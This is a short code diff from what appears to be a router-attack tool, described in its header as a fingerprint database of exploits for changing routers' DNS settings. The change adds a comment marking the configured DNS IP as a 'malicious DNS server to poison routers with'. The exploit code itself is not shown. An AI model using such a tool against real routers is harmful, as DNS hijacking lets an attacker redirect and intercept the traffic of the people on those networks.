@@ -1,7 +1,7 @@
 /*
  * This is a fingerprint database with exploits to change the DNS server set by the router
 */
-var dns_server_ip = '8.8.8.8';
+var dns_server_ip = '8.8.8.8'; // IP address of malicious DNS server to poison routers with
 var fingerprints = [
     {
         'name': "ASUS RT-N66U",
